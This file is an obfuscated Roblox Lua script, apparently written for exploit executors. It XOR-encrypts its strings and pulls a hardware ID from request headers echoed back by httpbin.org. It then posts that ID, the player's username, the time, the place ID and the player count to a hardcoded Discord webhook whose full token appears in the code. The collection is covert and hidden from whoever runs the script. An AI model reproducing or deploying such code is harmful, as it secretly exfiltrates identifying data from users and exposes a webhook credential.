--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.5) ~  Much Love, Ferib 

]]--

local obf_stringchar = string.char;
local obf_stringbyte = string.byte;
local obf_stringsub = string.sub;
local obf_bitlib = bit32 or bit;
local obf_XOR = obf_bitlib.bxor;
local obf_tableconcat = table.concat;
local obf_tableinsert = table.insert;
local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
	local result = {};
	for i = 1, #LUAOBFUSACTOR_STR do
		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + ((i - 1) % #LUAOBFUSACTOR_KEY), 1 + ((i - 1) % #LUAOBFUSACTOR_KEY) + 1))) % 256));
	end
	return obf_tableconcat(result);
end
CreateWebHookMessage = function(v0, v1, v2)
	local v4 = http_request;
	if (syn or (4176 == 4036)) then
		v4 = syn.request;
	elseif SENTINEL_V2 then
		v4 = function(v18)
			return {[LUAOBFUSACTOR_DECRYPT_STR_0("\250\91\166\60\38\91\108\198\75\162", "\169\47\199\72\83\40\47")]=200,[LUAOBFUSACTOR_DECRYPT_STR_0("\132\212\130\227", "\198\187\230\154\107\169\24")]=request(v18.Url, v18.Method, v18.Body or "")};
		end;
	end
	local v5 = v4({[LUAOBFUSACTOR_DECRYPT_STR_0("\21\78\73", "\64\60\37\208\179\201\192\189")]="https://httpbin.org/get",[LUAOBFUSACTOR_DECRYPT_STR_0("\158\220\105\214\34\183", "\211\185\29\190\77")]=LUAOBFUSACTOR_DECRYPT_STR_0("\200\126\237", "\143\59\185\231\54\207\92\127")}).Body;
	local v6 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\214\225\3\16\205\240\5\22\247\246\18", "\158\149\119\96")):JSONDecode(v5);
	local v7 = {LUAOBFUSACTOR_DECRYPT_STR_0("\240\155\74\236\86\45\205\133\65\179\96\54\202\140\80", "\163\226\36\193\16\68"),LUAOBFUSACTOR_DECRYPT_STR_0("\8\99\23\126\182\217\57\54\32\103\176\212", "\77\27\103\18\217\176"),LUAOBFUSACTOR_DECRYPT_STR_0("\130\97\123\42\36\255\70\103\59\57\255\90\112\59\37\166\122\114\55\46\160", "\210\19\20\94\75"),LUAOBFUSACTOR_DECRYPT_STR_0("\141\32\142\224\92\84\187\41\205\210\92\84\185\32\146\228\71\83\176\49", "\222\69\224\148\53\58")};
	hwid = "";
	for v8, v9 in next, v7 do
		if v6.headers[v9] then
			hwid = v6.headers[v9];
			break;
		end
	end
	if (hwid or (4046 < 196)) then
		local v11 = game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\122\48\100\208\149\135\64\50\121\195\163", "\50\68\16\160\198\226"));
		local v12 = "https://discord.com/api/webhooks/1084179555742388355/wFM7TtpvA0hMDWfGnDI6FbPjsYRGhnmsnUOGX9huBut8CjxZRoHQkpzLBVSPaSAUQ0jP";
		local v13 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\165\131\42\52\31\195\55", "\198\236\68\64\122\173\67\233")]="",[LUAOBFUSACTOR_DECRYPT_STR_0("\227\13\237\135\226\19", "\134\96\143\226")]={{[LUAOBFUSACTOR_DECRYPT_STR_0("\238\76\232\247\63", "\154\37\156\155\90\179\100\230")]=LUAOBFUSACTOR_DECRYPT_STR_0("\58\22\129\96\150\189\2\46\206\56\240\248\58\22", "\101\73\171\74\218\210"),[LUAOBFUSACTOR_DECRYPT_STR_0("\206\26\229\196", "\186\99\149\161\85\173")]=LUAOBFUSACTOR_DECRYPT_STR_0("\173\112\88\245", "\223\25\59\157\216"),[LUAOBFUSACTOR_DECRYPT_STR_0("\64\116\182\49\0", "\35\27\218\94\114\107\103")]=v2,[LUAOBFUSACTOR_DECRYPT_STR_0("\67\47\215\72\183\86", "\37\70\178\36\211")]={{[LUAOBFUSACTOR_DECRYPT_STR_0("\88\141\218\79", "\54\236\183\42\170\199\181")]=v0,[LUAOBFUSACTOR_DECRYPT_STR_0("\181\14\178\200\237", "\195\111\222\189\136\16\147\131")]=v1,[LUAOBFUSACTOR_DECRYPT_STR_0("\5\126\135\123\25\163", "\108\16\235\18\119\198\212\31")]=true}}}}};
		local v14 = v11:JSONEncode(v13);
		local v15 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\29\51\225\10\85\83\6\83\40\246\14\85", "\126\92\143\126\48\61\114")]="application/json"};
		local v16 = {[LUAOBFUSACTOR_DECRYPT_STR_0("\61\196\182", "\104\182\218\92\126")]=v12,[LUAOBFUSACTOR_DECRYPT_STR_0("\141\53\162\96", "\207\90\198\25\150\38\215")]=v14,[LUAOBFUSACTOR_DECRYPT_STR_0("\224\181\197\121\119\201", "\173\208\177\17\24")]=LUAOBFUSACTOR_DECRYPT_STR_0("\108\81\111\79", "\60\30\60\27"),[LUAOBFUSACTOR_DECRYPT_STR_0("\212\221\77\229\215\238\203", "\156\184\44\129\178")]=v15};
		v4(v16);
	end
end;
infoForMessage = game.PlaceId;
serverForMessage = LUAOBFUSACTOR_DECRYPT_STR_0("\133\243\61\6\46\43\187", "\232\154\78\117\71\69\220");
TIMEcurrent = os.date(LUAOBFUSACTOR_DECRYPT_STR_0("\126\140\189\127\87\21\62\78\126\137\189\122\81\14\108\75\8\228\238\114\91\64\100\59\15\135\182\37\17", "\91\196\157\23\56\96\76\110"));
CreateWebHookMessage(LUAOBFUSACTOR_DECRYPT_STR_0("\147\172\222\97\209\177\18\227", "\195\201\172\18\190\223\40") .. Game.Players.LocalPlayer.Name .. LUAOBFUSACTOR_DECRYPT_STR_0("\180\172\55", "\148\150\23\35\211\117") .. TIMEcurrent, serverForMessage .. " / MapID: " .. infoForMessage .. " / Total Players: " .. tostring(#game.Players:GetPlayers()) .. "", 0);
